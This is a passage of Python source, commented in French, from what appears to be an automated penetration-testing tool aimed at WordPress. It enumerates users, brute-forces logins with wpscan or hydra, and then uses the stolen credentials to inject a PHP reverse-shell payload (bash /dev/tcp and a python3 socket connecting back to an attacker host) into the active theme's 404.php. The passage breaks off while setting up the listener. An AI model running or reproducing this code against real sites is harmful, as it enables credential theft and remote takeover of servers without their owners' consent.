    wp_version = None
    m = _re.search(r'WordPress version\s+([\d\.]+)', scan_out)
    if m:
        wp_version = m.group(1)
        ok(f"[WPRecon] Version WP: {wp_version}")
        lines.append(f"[WP Version] {wp_version}")

    # Plugins vulnérables — wpscan affiche "[!] Title: PluginName X.Y"
    vuln_plugins: List[str] = []
    for m in _re.finditer(
        r'\[!\]\s+(?:Title|Plugin):\s*(.+?)(?:\n|$)', scan_out
    ):
        plugin = m.group(1).strip()
        if plugin not in vuln_plugins:
            vuln_plugins.append(plugin)
            warn(f"[WPRecon] Plugin vulnérable: {plugin}")
            lines.append(f"[VULN PLUGIN] {plugin}")

    # CVEs mentionnés dans la sortie
    cves: List[str] = list(set(_re.findall(r'CVE-\d{4}-\d+', scan_out)))
    if cves:
        ok(f"[WPRecon] CVEs trouvés: {cves}")
        lines.append(f"[CVEs] {', '.join(cves)}")

    # Usernames
    for m in _re.finditer(r'(?:Login|Username)[:\s]+([a-zA-Z0-9_\-\.]+)', scan_out, _re.I):
        u = m.group(1).strip()
        if u.lower() not in {"login", "username", "found", "identified", "wordpress"} \
                and u not in valid_users:
            valid_users.append(u)
    # Pattern alternatif wpscan: " | [+] elliot"
    for m in _re.findall(r'\|\s+\[[\+!]\]\s+([a-zA-Z0-9_\-\.]{2,30})', scan_out):
        u = m.strip()
        if u.lower() not in {"wordpress", "upload", "readme", "license", "xmlrpc",
                              "wp", "login", "admin", "themes", "plugins"} \
                and u not in valid_users:
            valid_users.append(u)
    if valid_users:
        ok(f"[WPRecon] Utilisateurs: {valid_users}")
        lines.append(f"[Users] {valid_users}")
        # Sauvegarder pour le module brute force
        (logs_dir / "wp_users.txt").write_text("\n".join(valid_users), encoding="utf-8")

    # XML-RPC détecté ?
    xmlrpc_enabled = "xmlrpc" in scan_out.lower() and (
        "enabled" in scan_out.lower() or "xmlrpc.php" in scan_out.lower()
    )

    # ── 4. Test XML-RPC ──────────────────────────────────────────────
    import urllib.request as _ur
    import urllib.error   as _ue
    import ssl as _ssl
    _ctx = _ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = _ssl.CERT_NONE

    info(f"[WPRecon] Test XML-RPC → {xmlrpc_url}")
    lines += ["", f"# Test XML-RPC: {xmlrpc_url}"]
    try:
        # Probe: POST listMethods
        xmlrpc_payload = b"""<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params/></methodCall>"""
        req = _ur.Request(xmlrpc_url, data=xmlrpc_payload,
                          headers={"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0"})
        with _ur.urlopen(req, timeout=15, context=_ctx) as r:
            xmlrpc_body = r.read(4000).decode("utf-8", errors="replace")
        if "methodResponse" in xmlrpc_body or "methodName" in xmlrpc_body:
            xmlrpc_enabled = True
            ok("[WPRecon] XML-RPC ACTIVÉ — endpoint accessible")
            lines.append("[XML-RPC] Activé et accessible")
            findings_wp.append({
                "title": "XML-RPC WordPress activé",
                "severity": "medium",
                "detail": "L'endpoint /xmlrpc.php répond. Permet brute force amplifié (1 requête = N essais) et SSRF via Pingback.",
                "remediation": "Désactiver XML-RPC si non utilisé (plugins: Disable XML-RPC).",
            })
            # Test: wp.getUsersBlogs avec creds vides → confirme user enum possible
            xmlrpc_enum_payload = b"""<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value><string>admin</string></value></param>
<param><value><string>WRONG</string></value></param></params></methodCall>"""
            req2 = _ur.Request(xmlrpc_url, data=xmlrpc_enum_payload,
                               headers={"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0"})
            try:
                with _ur.urlopen(req2, timeout=15, context=_ctx) as r2:
                    body2 = r2.read(2000).decode("utf-8", errors="replace")
                if "Incorrect username" in body2 or "incorrect_password" in body2 \
                        or "faultCode" in body2:
                    lines.append("[XML-RPC] User enum via wp.getUsersBlogs confirmé")
                    findings_wp.append({
                        "title": "XML-RPC — Enumération utilisateurs possible",
                        "severity": "medium",
                        "detail": "wp.getUsersBlogs retourne des erreurs distinctes selon que l'username existe ou non.",
                    })
            except Exception as _exc:
                warn(f"[run_wpscan_recon] {_exc}")
        else:
            lines.append("[XML-RPC] Endpoint présent mais réponse inattendue")
    except _ue.HTTPError as e:
        if e.code == 403:
            lines.append("[XML-RPC] Désactivé (403 Forbidden)")
        elif e.code == 405:
            lines.append("[XML-RPC] Accessible (405 Method Not Allowed sur GET)")
            xmlrpc_enabled = True
        else:
            lines.append(f"[XML-RPC] HTTP {e.code}")
    except Exception as ex:
        lines.append(f"[XML-RPC] Non accessible: {ex}")

    # ── 5. Searchsploit sur CVEs et plugins vulnérables ──────────────
    if (cves or vuln_plugins or wp_version) and which("searchsploit"):
        info("[WPRecon] Recherche exploits via searchsploit...")
        lines += ["", "# Searchsploit"]

        search_terms: List[str] = []
        if wp_version:
            search_terms.append(f"WordPress {wp_version}")
        for plugin in vuln_plugins[:5]:   # max 5 plugins
            # Extraire juste le nom sans la version
            plugin_name = _re.split(r'[\d<>]', plugin)[0].strip()
            if plugin_name:
                search_terms.append(f"WordPress {plugin_name}")
        for cve in cves[:5]:
            search_terms.append(cve)

        for term in search_terms:
            try:
                sp = subprocess.run(
                    ["searchsploit", "--color", term],
                    capture_output=True, text=True, timeout=15
                )
                sp_out = sp.stdout.strip()
                if sp_out and "No Results" not in sp_out:
                    ok(f"[WPRecon] Exploits pour '{term}':")
                    lines += [f"$ searchsploit {term}", sp_out[:2000], ""]
                    findings_wp.append({
                        "title": f"Exploit disponible — {term}",
                        "severity": "high",
                        "detail": sp_out[:500],
                        "source": "searchsploit",
                    })
            except Exception as _exc:
                warn(f"[run_wpscan_recon] {_exc}")

    # ── 6. Références Metasploit si vulnérabilités trouvées ──────────
    msf_modules: List[str] = []
    if xmlrpc_enabled:
        msf_modules.append("auxiliary/scanner/http/wordpress_xmlrpc_login")
    if wp_version and _re.match(r'[34]\.', wp_version or ""):
        msf_modules.append("auxiliary/scanner/http/wordpress_login_enum")
    for cve in cves:
        msf_modules.append(f"search {cve}")

    if msf_modules:
        lines += ["", "# Modules Metasploit suggérés"]
        for mod in msf_modules:
            lines.append(f"  msf6 > use {mod}")

    # ── 7. Synthèse du finding ────────────────────────────────────────
    out.write_text("\n".join(lines), encoding="utf-8")

    severity = "info"
    details  = []
    if vuln_plugins:
        severity = "high"
        details.append(f"{len(vuln_plugins)} plugin(s) vulnérable(s)")
    if cves:
        severity = "high"
        details.append(f"CVEs: {', '.join(cves)}")
    if xmlrpc_enabled:
        if severity == "info":
            severity = "medium"
        details.append("XML-RPC activé")
    if wp_version:
        details.append(f"WP {wp_version}")
    if valid_users:
        details.append(f"Users: {valid_users}")

    ok(f"[WPRecon] Terminé — {', '.join(details) or 'aucune vulnérabilité critique'}")
    return {
        "title": "WordPress — Recon complet",
        "severity": severity,
        "detail": " | ".join(details) if details else f"WordPress détecté sur {wp_base_url}",
        "wp_version": wp_version,
        "valid_users": valid_users,
        "cves": cves,
        "vuln_plugins": vuln_plugins,
        "xmlrpc_enabled": xmlrpc_enabled,
        "msf_modules": msf_modules,
        "source": "wpscan_recon",
        "evidence_file": str(out),
    }


# -------------------- WORDPRESS BRUTEFORCE --------------------

# Usernames courants à tester pour l'énumération
_WP_COMMON_USERS = [
    "admin", "administrator", "user", "root", "test", "webmaster",
    "wp-admin", "wordpress", "manager", "support", "info", "guest",
]

def run_wordpress_bruteforce(cfg: Config, urls: List[str], logs_dir: Path) -> Optional[dict]:
    """
    WordPress recon & brute force via wpscan :
      Phase 1 — wpscan --enumerate u  → détecte les usernames (REST API, /?author=N, etc.)
      Phase 2 — wpscan --passwords    → brute force avec le wordlist
    Fallback hydra si wpscan absent.
    """
    if not cfg.run_wp_brute:
        return None

    # ── 1. Détecter WordPress ─────────────────────────────────────────────
    wp_base_url: Optional[str] = None
    for u in urls:
        if "wp-login" in u.lower() or "wp-admin" in u.lower():
            wp_base_url = u.split("wp-")[0].rstrip("/")
            break

    if not wp_base_url:
        return None

    # Préférer HTTP (évite SSL auto-signé dans les labs)
    wp_base_url = wp_base_url.replace("https://", "http://")

    info(f"[WPScan] WordPress brute force → {wp_base_url}")
    out   = logs_dir / "wordpress_bruteforce.txt"
    lines = [f"# WordPress brute force — {now_iso()}", f"# Target: {wp_base_url}", ""]

    # ── 1b. Récupérer les users trouvés par wpscan_recon si dispo ────────
    _preloaded_users: List[str] = []
    _users_file_pre = logs_dir / "wp_users.txt"
    if _users_file_pre.exists():
        _preloaded_users = [l.strip() for l in _users_file_pre.read_text().splitlines() if l.strip()]
        if _preloaded_users:
            ok(f"[WPScan] Users pré-chargés depuis recon: {_preloaded_users}")
            lines.append(f"[Users pré-chargés] {_preloaded_users}")

    # ── 2. Trouver le wordlist ────────────────────────────────────────────
    wordlist: Optional[Path] = None
    for search_dir in [logs_dir / "robots_downloads", logs_dir / "ffuf_downloads"]:
        if search_dir.exists():
            for dic in sorted(search_dir.glob("*.dic")) + sorted(search_dir.glob("*.txt")):
                if dic.stat().st_size > 1000:
                    wordlist = dic
                    break
        if wordlist:
            break

    if not wordlist:
        for fallback in [
            Path("/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"),
            Path("/usr/share/wordlists/rockyou.txt"),
        ]:
            if fallback.exists():
                wordlist = fallback
                break

    if not wordlist:
        warn("[WPScan] Aucun wordlist disponible — skip")
        return None

    ok(f"[WPScan] Wordlist: {wordlist} ({wordlist.stat().st_size // 1024} Ko)")
    lines.append(f"[Wordlist] {wordlist}")

    # ── 3. Déduplication du wordlist si volumineux ───────────────────────
    dedup_wordlist = wordlist
    if wordlist.stat().st_size > 5_000_000:
        info("[WPScan] Wordlist volumineux → déduplication...")
        seen_w: set = set()
        dedup_path = logs_dir / f"dedup_{wordlist.name}"
        with wordlist.open("r", errors="replace") as f_in, \
             dedup_path.open("w") as f_out:
            for ln in f_in:
                w = ln.strip()
                if w and w not in seen_w:
                    seen_w.add(w)
                    f_out.write(w + "\n")
        ok(f"[WPScan] Dédup: {len(seen_w)} mots uniques → {dedup_path.name}")
        lines.append(f"[Wordlist dédup] {len(seen_w)} mots uniques")
        dedup_wordlist = dedup_path

    # ── 4. wpscan disponible ? ────────────────────────────────────────────
    wpscan_bin = shutil.which("wpscan")

    if wpscan_bin:
        # ── Phase 1 : Enumération des utilisateurs ────────────────────────
        import re as _re
        valid_users: List[str] = list(_preloaded_users)  # users du recon si dispo

        if valid_users:
            info(f"[WPScan] Phase 1 — Users pré-chargés depuis recon: {valid_users}, skip enum")
        else:
            info("[WPScan] Phase 1 — Enumération des utilisateurs via wpscan...")
            wpscan_enum_out = logs_dir / "wpscan_enum.txt"
            cmd_enum = [
                wpscan_bin,
                "--url", wp_base_url,
                "--enumerate", "u",
                "--disable-tls-checks",
                "--no-banner",
            ]
            lines += [f"$ {' '.join(cmd_enum)}", ""]
            try:
                proc_enum = subprocess.run(
                    cmd_enum, capture_output=True, text=True, timeout=180
                )
                enum_out = proc_enum.stdout + proc_enum.stderr
                lines.append(enum_out[:5000])
                wpscan_enum_out.write_text(enum_out, encoding="utf-8")
            except subprocess.TimeoutExpired:
                warn("[WPScan] Enum timeout")
                enum_out = ""
            except Exception as e:
                warn(f"[WPScan] Enum erreur: {e}")
                enum_out = ""

            for m in _re.findall(r'(?:^|\|)\s*\[[\+!]\]\s*([a-zA-Z0-9_\-\.]+)', enum_out, _re.M):
                candidate = m.strip()
                if candidate.lower() not in {"wordpress", "upload", "admin", "readme",
                                              "license", "wp", "login", "xmlrpc"} \
                        and candidate not in valid_users:
                    valid_users.append(candidate)
            for m in _re.findall(r'Login:\s*([^\s,]+)', enum_out, _re.I):
                u = m.strip()
                if u and u not in valid_users:
                    valid_users.append(u)

        if valid_users:
            ok(f"[WPScan] Utilisateurs trouvés: {valid_users}")
            lines.append(f"[Users] {valid_users}")
        else:
            warn("[WPScan] Aucun user trouvé via --enumerate u — tentative avec wordlist comme usernames...")
            # Fallback : tester chaque mot du wordlist comme username (WP 4.x leaks usernames)
            import urllib.request as _ur
            import urllib.error   as _ue
            import urllib.parse   as _up
            import ssl as _ssl
            import concurrent.futures as _cf2
            _ssl_ctx2 = _ssl.create_default_context()
            _ssl_ctx2.check_hostname = False
            _ssl_ctx2.verify_mode = _ssl.CERT_NONE
            _wp_login = wp_base_url.rstrip("/") + "/wp-login.php"
            _words: List[str] = []
            _seen2: set = set()
            with dedup_wordlist.open("r", errors="replace") as _f:
                for _ln in _f:
                    w = _ln.strip()
                    if w and w not in _seen2:
                        _seen2.add(w)
                        _words.append(w)
            info(f"[WPScan] Enum fallback: {len(_words)} mots → wp-login.php (arrêt au 1er username valide)")

            import threading as _threading
            _stop_enum = _threading.Event()   # signale l'arrêt dès le 1er username trouvé

            def _chk(word: str) -> Optional[str]:
                if _stop_enum.is_set():
                    return None   # arrêt rapide
                try:
                    data = _up.urlencode({
                        "log": word, "pwd": "WRONG_PWD_ENUM_ONLY",
                        "wp-submit": "Log In", "redirect_to": "/wp-admin/", "testcookie": "1",
                    }).encode()
                    req = _ur.Request(_wp_login, data=data, headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Cookie": "wordpress_test_cookie=WP+Cookie+check",
                    })
                    with _ur.urlopen(req, timeout=8, context=_ssl_ctx2) as r:
                        body = r.read(5000).decode("utf-8", errors="replace")
                except _ue.HTTPError as e:
                    try:
                        body = e.read(5000).decode("utf-8", errors="replace")
                    except Exception:
                        return None
                except Exception:
                    return None
                if "Invalid username" in body or "invalid_username" in body:
                    return None
                if "incorrect" in body.lower() or "The password" in body:
                    return word
                return None

            with _cf2.ThreadPoolExecutor(max_workers=20) as pool:
                for result in pool.map(_chk, _words):
                    if result and result not in valid_users:
                        valid_users.append(result)
                        _stop_enum.set()   # stoppe tous les autres threads
                        ok(f"[+] [WPScan] Username valide: {result}")
                        lines.append(f"[USERNAME] {result}")
                        break   # on a ce qu'on veut, on passe à Phase 2

        if not valid_users:
            warn("[WPScan] Aucun username valide trouvé")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None

        lines += [f"[Users confirmés] {valid_users}", ""]

        # ── Phase 2 : Brute force passwords ──────────────────────────────
        info(f"[WPScan] Phase 2 — Brute force passwords ({valid_users})...")
        users_file = logs_dir / "wp_users.txt"
        users_file.write_text("\n".join(valid_users), encoding="utf-8")

        wpscan_brute_out = logs_dir / "wpscan_bruteforce.txt"
        # Note: on n'utilise PAS --output ici car wpscan redirige sa sortie vers le
        # fichier ET subprocess capture stdout → write_text écraserait le fichier avec
        # du vide. On capture stdout directement et on l'écrit nous-mêmes.
        cmd_brute = [
            wpscan_bin,
            "--url", wp_base_url,
            "--usernames", str(users_file),
            "--passwords", str(dedup_wordlist),
            "--disable-tls-checks",
            "--no-banner",
            "--max-threads", "5",
        ]
        lines += [f"$ {' '.join(cmd_brute)}", ""]
        try:
            proc_brute = subprocess.run(
                cmd_brute, capture_output=True, text=True, timeout=900
            )
            # stdout contient les résultats, stderr contient warnings/progress
            brute_stdout = proc_brute.stdout or ""
            brute_stderr = proc_brute.stderr or ""
            brute_out = brute_stdout + ("\n[stderr]\n" + brute_stderr if brute_stderr.strip() else "")
            lines.append(brute_stdout[:10000])
            if brute_stderr.strip():
                lines.append(f"[stderr] {brute_stderr[:1000]}")
            # Écriture dans le fichier log (stdout uniquement pour lisibilité)
            wpscan_brute_out.write_text(
                "\n".join(lines), encoding="utf-8"
            )
        except subprocess.TimeoutExpired:
            warn("[WPScan] Brute force timeout (15 min)")
            lines.append("[!] TIMEOUT wpscan brute force")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None
        except Exception as e:
            warn(f"[WPScan] Brute force erreur: {e}")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None

        # Parser les credentials
        creds: List[dict] = []
        # wpscan affiche : "Username: elliot, Password: ER28-0652"
        for m in _re.finditer(
            r'[Uu]sername[:\s]+([^\s,]+)[,\s]+[Pp]assword[:\s]+([^\s]+)',
            brute_out
        ):
            u, p = m.group(1).strip(), m.group(2).strip()
            creds.append({"user": u, "password": p})
            ok(f"[+] [WPScan] CREDENTIAL TROUVÉ: {u}:{p}")
            lines.append(f"[CRED] {u}:{p}")

        # Fallback pattern wpscan: "| Username: ... | Password: ..."
        if not creds:
            for m in _re.finditer(r'Password found.*?(\w+):(\S+)', brute_out, _re.I):
                u, p = m.group(1).strip(), m.group(2).strip()
                creds.append({"user": u, "password": p})
                ok(f"[+] [WPScan] CREDENTIAL: {u}:{p}")
                lines.append(f"[CRED] {u}:{p}")

    else:
        # ── Fallback : hydra si wpscan absent ────────────────────────────
        warn("[WPScan] wpscan non disponible — fallback hydra")
        lines.append("[!] wpscan absent, utilisation de hydra")
        valid_users = []
        creds = []

        # Enum via wp-login.php
        import urllib.request as _ur
        import urllib.error   as _ue
        import urllib.parse   as _up
        import ssl as _ssl
        import concurrent.futures as _cf3
        _ssl_ctx3 = _ssl.create_default_context()
        _ssl_ctx3.check_hostname = False
        _ssl_ctx3.verify_mode = _ssl.CERT_NONE
        _wp_login = wp_base_url.rstrip("/") + "/wp-login.php"
        _words2: List[str] = []
        _seen3: set = set()
        with dedup_wordlist.open("r", errors="replace") as _f2:
            for _ln2 in _f2:
                w2 = _ln2.strip()
                if w2 and w2 not in _seen3:
                    _seen3.add(w2)
                    _words2.append(w2)

        def _chk2(word: str) -> Optional[str]:
            try:
                data = _up.urlencode({
                    "log": word, "pwd": "WRONG_PWD_ENUM_ONLY",
                    "wp-submit": "Log In", "redirect_to": "/wp-admin/", "testcookie": "1",
                }).encode()
                req = _ur.Request(_wp_login, data=data, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "wordpress_test_cookie=WP+Cookie+check",
                })
                with _ur.urlopen(req, timeout=20, context=_ssl_ctx3) as r:
                    body = r.read(5000).decode("utf-8", errors="replace")
            except _ue.HTTPError as e:
                try:
                    body = e.read(5000).decode("utf-8", errors="replace")
                except Exception:
                    return None
            except Exception:
                return None
            if "Invalid username" in body or "invalid_username" in body:
                return None
            if "incorrect" in body.lower() or "The password" in body:
                return word
            return None

        with _cf3.ThreadPoolExecutor(max_workers=10) as pool:
            for result in pool.map(_chk2, _words2):
                if result and result not in valid_users:
                    valid_users.append(result)
                    ok(f"[+] Username: {result}")
                    lines.append(f"[USERNAME] {result}")

        if not valid_users:
            warn("[Hydra] Aucun username — skip")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None

        users_file = logs_dir / "wp_users.txt"
        users_file.write_text("\n".join(valid_users), encoding="utf-8")

        from urllib.parse import urlparse as _urlp
        _parsed = _urlp(wp_base_url)
        _host   = _parsed.hostname
        hydra_out = logs_dir / "wordpress_hydra.txt"
        cmd_hydra = [
            "hydra", "-L", str(users_file), "-P", str(dedup_wordlist),
            "-t", "4", "-f", "-o", str(hydra_out),
            _host, "http-post-form",
            "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In"
            "&redirect_to=%2Fwp-admin%2F&testcookie=1:Invalid username",
        ]
        lines += [f"$ {' '.join(cmd_hydra)}", ""]
        try:
            proc_h = subprocess.run(cmd_hydra, capture_output=True, text=True, timeout=600)
            h_out = proc_h.stdout + proc_h.stderr
            lines.append(h_out[:10000])
        except subprocess.TimeoutExpired:
            warn("[Hydra] timeout")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None
        except Exception as e:
            warn(f"[Hydra] erreur: {e}")
            out.write_text("\n".join(lines), encoding="utf-8")
            return None

        if hydra_out.exists():
            import re as _re2
            for m in _re2.finditer(r'login:\s*(\S+)\s+password:\s*(\S+)', hydra_out.read_text(errors="replace"), _re2.I):
                u, p = m.group(1), m.group(2)
                creds.append({"user": u, "password": p})
                ok(f"[+] [Hydra] CREDENTIAL: {u}:{p}")
                lines.append(f"[CRED] {u}:{p}")

    out.write_text("\n".join(lines), encoding="utf-8")

    if creds:
        return {
            "title": "WordPress — Credentials trouvés",
            "severity": "critical",
            "detail": f"Login WordPress valide: {creds[0]['user']}:{creds[0]['password']}",
            "creds": creds,
            "source": "wordpress_bruteforce",
            "evidence_file": str(out),
        }
    return {
        "title": "WordPress — Scan terminé (aucun credential)",
        "severity": "info",
        "detail": f"Wordlist épuisée pour {valid_users}",
        "source": "wordpress_bruteforce",
        "evidence_file": str(out),
    }


# -------------------- WORDPRESS POST-EXPLOITATION (Theme Injection) --------------------
def run_wordpress_theme_inject(cfg: "Config", wp_url: str, creds: List[dict], logs_dir: Path) -> Optional[dict]:
    """
    Post-exploitation WordPress via l'éditeur de thème wp-admin :
      1. Login wp-admin avec credentials trouvés
      2. Détecte le thème actif
      3. Injecte un payload PHP dans 404.php via l'API AJAX wp-admin
      4. Déclenche le payload (requête 404) + listener TCP
    Nécessite : cfg.run_wp_exploit + credentials valides + cfg.lhost défini.
    """
    if not cfg.run_wp_exploit:
        return None
    if not creds:
        warn("[WP Exploit] Aucun credential WP disponible — skipping")
        return None
    if not cfg.lhost:
        warn("[WP Exploit] --lhost non défini — impossible de générer le payload. Définissez votre IP VPN.")
        return None

    # ── Confirmation utilisateur ──────────────────────────────────────────
    cred0 = creds[0]
    confirmed = _webui_confirm(
        cfg,
        action_id="wp_theme_inject",
        title="WordPress — Theme File Injection (Reverse Shell)",
        details=(
            f"Cible      : {wp_url}\n"
            f"Credentials: {cred0['user']}:{cred0['password']}\n"
            f"Action     : Injection d'un payload PHP dans 404.php du thème actif\n"
            f"Listener   : {cfg.lhost}:{cfg.lport}\n"
            "⚠️ Cette action MODIFIE un fichier PHP sur le serveur cible."
        ),
        timeout=900,
    )
    if not confirmed:
        warn("[WP Exploit] Refusé ou timeout — skipping")
        return None

    # ── Vérifier que requests est disponible ─────────────────────────────
    try:
        import requests as _req
        try:
            _req.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
        except Exception as _exc:
            warn(f"[run_wordpress_theme_inject] {_exc}")
    except ImportError:
        warn("[WP Exploit] Module 'requests' non disponible — skipping")
        return None

    import re as _re_wp
    import socket as _sock_wp
    import threading as _thr_wp

    out   = logs_dir / "wp_theme_inject.txt"
    lines = [f"# WordPress Theme Injection — {now_iso()}", f"# Target: {wp_url}", ""]

    sess = _req.Session()
    sess.verify = False
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    # ── 1. Login wp-admin ─────────────────────────────────────────────────
    login_url = f"{wp_url}/wp-login.php"
    info(f"[WP Exploit] Login → {login_url} ({cred0['user']})")
    lines.append(f"[*] POST {login_url} → {cred0['user']}:{cred0['password']}")
    try:
        # Fixer le cookie de test d'abord
        sess.get(login_url, timeout=10)
        resp = sess.post(login_url, data={
            "log": cred0["user"], "pwd": cred0["password"],
            "wp-submit": "Log In",
            "redirect_to": f"{wp_url}/wp-admin/",
            "testcookie": "1",
        }, timeout=15, allow_redirects=True)
        # Détection login réussi : cookie wp-admin ou Dashboard dans body
        if "Dashboard" not in resp.text and "wp-admin" not in resp.url and "dashboard" not in resp.url.lower():
            # Retry sans redirect
            resp2 = sess.post(login_url, data={
                "log": cred0["user"], "pwd": cred0["password"],
                "wp-submit": "Log In", "testcookie": "1",
            }, timeout=15, allow_redirects=False)
            if resp2.status_code not in (301, 302):
                warn(f"[WP Exploit] Login échoué (HTTP {resp2.status_code})")
                lines.append(f"[!] Login échoué — HTTP {resp.status_code}")
                out.write_text("\n".join(lines), encoding="utf-8")
                return None
        ok(f"[WP Exploit] Authentifié sur wp-admin ✓")
        lines.append("[+] Login réussi")
    except Exception as e:
        warn(f"[WP Exploit] Erreur login: {e}")
        lines.append(f"[!] Erreur login: {e}")
        out.write_text("\n".join(lines), encoding="utf-8")
        return None

    # ── 2. Détecter le thème actif ────────────────────────────────────────
    theme_name = None
    try:
        r_editor = sess.get(f"{wp_url}/wp-admin/theme-editor.php", timeout=10)
        # Chercher la valeur sélectionnée dans le dropdown des thèmes
        m = _re_wp.search(r'<option[^>]+value="([^"]+)"[^>]+selected', r_editor.text, _re_wp.I)
        if not m:
            m = _re_wp.search(r'theme=([a-z0-9_-]+)', r_editor.text, _re_wp.I)
        if m:
            theme_name = m.group(1)
        if not theme_name:
            # Fallback : template dir dans les meta
            m2 = _re_wp.search(r'"template"\s*:\s*"([^"]+)"', r_editor.text)
            if m2:
                theme_name = m2.group(1)
        if not theme_name:
            theme_name = "twentyfifteen"   # thème par défaut WordPress 4.3
        lines.append(f"[*] Thème actif: {theme_name}")
        info(f"[WP Exploit] Thème actif détecté: {theme_name}")
    except Exception as e:
        theme_name = "twentyfifteen"
        warn(f"[WP Exploit] Détection thème: {e} → fallback '{theme_name}'")
        lines.append(f"[?] Fallback thème: {theme_name}")

    # ── 3. Récupérer 404.php + nonce (avec check DISALLOW_FILE_EDIT) ──────
    file_slug  = "404.php"
    editor_url = f"{wp_url}/wp-admin/theme-editor.php?file={file_slug}&theme={theme_name}"
    nonce      = None
    original   = "<?php\n"
    try:
        r_file = sess.get(editor_url, timeout=10)

        # ── Vérification : éditeur désactivé ? ────────────────────────────
        editor_disabled_markers = [
            "File editing has been disabled",   # WordPress EN
            "editing files is not allowed",     # variante
            "DISALLOW_FILE_EDIT",               # si affiché dans le HTML
        ]
        if any(m in r_file.text for m in editor_disabled_markers):
            warn("[WP Exploit] Éditeur de thème DÉSACTIVÉ (DISALLOW_FILE_EDIT=true dans wp-config.php)")
            lines.append("[!] Éditeur désactivé — impossible d'injecter via l'interface")
            out.write_text("\n".join(lines), encoding="utf-8")
            return {
                "title":    "WordPress — Éditeur de thème désactivé",
                "severity": "info",
                "detail":   "DISALLOW_FILE_EDIT=true dans wp-config.php — injection via theme editor impossible.",
                "source":   "wp_theme_inject",
                "wp_url":   wp_url,
                "evidence_file": str(out),
            }

        # ── Nonce (requis pour soumettre le formulaire) ───────────────────
        m_n = _re_wp.search(r'"nonce"\s*:\s*"([a-f0-9]+)"', r_file.text)
        if not m_n:
            m_n = _re_wp.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', r_file.text)
        if m_n:
            nonce = m_n.group(1)

        # ── Contenu existant du fichier ───────────────────────────────────
        m_c = _re_wp.search(r'<textarea[^>]+id="newcontent"[^>]*>(.*?)</textarea>', r_file.text, _re_wp.DOTALL)
        if m_c:
            raw = m_c.group(1)
            original = (raw.replace("&lt;", "<").replace("&gt;", ">")
                           .replace("&amp;", "&").replace("&#039;", "'").replace("&quot;", '"'))
        else:
            # Textarea absent → éditeur non chargé (pas le bon thème ?)
            warn(f"[WP Exploit] Textarea non trouvé dans l'éditeur (thème '{theme_name}' correct ?)")
            lines.append(f"[?] Textarea manquant — thème peut-être différent")

        lines.append(f"[*] {file_slug}: {len(original)} bytes, nonce={nonce or 'N/A'}")
        info(f"[WP Exploit] {file_slug} récupéré ({len(original)} bytes)")
    except Exception as e:
        warn(f"[WP Exploit] Erreur récupération {file_slug}: {e}")
        lines.append(f"[!] {e}")
        out.write_text("\n".join(lines), encoding="utf-8")
        return None

    # ── 4. Préparer le payload PHP ─────────────────────────────────────
    # Payload background (nohup + &) : PHP ne bloque pas, shell survit à la fermeture HTTP
    # Essaie bash /dev/tcp puis python3 en fallback
    _ip, _p = cfg.lhost, cfg.lport
    php_payload = (
        f"\n/* pentool-v0.065 — {now_iso()} */\n"
        f"<?php\n"
        f"$_i='{_ip}'; $_p={_p};\n"
        f"@exec(\"nohup /bin/bash -c 'bash -i >& /dev/tcp/$_i/$_p 0>&1' > /dev/null 2>&1 &\");\n"
        f"@exec(\"nohup python3 -c 'import socket,os,subprocess as s;"
        f"k=socket.socket();k.connect((\\\"{_ip}\\\",{_p}));"
        f"os.dup2(k.fileno(),0);os.dup2(k.fileno(),1);os.dup2(k.fileno(),2);"
        f"s.call([\\\"/bin/bash\\\",\\\"-i\\\"])' > /dev/null 2>&1 &\");\n"
        f"?>\n"
    )
    new_content = original + php_payload
    lines.append(f"[*] Payload: /dev/tcp/{cfg.lhost}/{cfg.lport} (background nohup)")

    # ── 5. Soumettre le fichier modifié ──────────────────────────────────
    try:
        save_resp = sess.post(f"{wp_url}/wp-admin/theme-editor.php", data={
            "_wpnonce":           nonce or "",
            "_wp_http_referer":   f"/wp-admin/theme-editor.php?file={file_slug}&theme={theme_name}",
            "newcontent":         new_content,
            "action":             "edit-theme-plugin-file",
            "file":               file_slug,
            "theme":              theme_name,
            "nonce":              nonce or "",
            "wp_customize":       "off",
        }, timeout=15)
        if save_resp.status_code == 200 and (
            "File edited successfully" in save_resp.text
            or '"success":true' in save_resp.text
            or "updated" in save_resp.text.lower()
        ):
            ok(f"[WP Exploit] Payload injecté dans {theme_name}/{file_slug} ✓")
            lines.append(f"[+] Payload injecté (HTTP {save_resp.status_code})")
        else:
            # L'injection a peut-être réussi même sans message explicite
            warn(f"[WP Exploit] Réponse ambiguë (HTTP {save_resp.status_code}) — tentative de déclenchement quand même")
            lines.append(f"[?] HTTP {save_resp.status_code} — déclenchement en cours")
    except Exception as e:
        warn(f"[WP Exploit] Erreur lors de la sauvegarde: {e}")
        lines.append(f"[!] Erreur sauvegarde: {e}")
        out.write_text("\n".join(lines), encoding="utf-8")
        return None

    # ── 6. Listener TCP + déclenchement du payload (même architecture que FTP) ──
    info(f"[WP Exploit] PAYLOAD INJECTE dans {theme_name}/404.php")
    info(f"[WP Exploit] LHOST dans le payload : {cfg.lhost}:{cfg.lport}")
    info(f"[WP Exploit] Listener 0.0.0.0:{cfg.lport} — attente 90s (meme que FTP)...")
    lines.append(f"[*] Listener: 0.0.0.0:{cfg.lport} | LHOST payload: {cfg.lhost}:{cfg.lport}")

    shell_obtained = False
    shell_addr     = None
    shell_results: dict = {}
    shell_conn_wp  = None

    # Listener dans un thread (non-bloquant, exactement comme FTP)
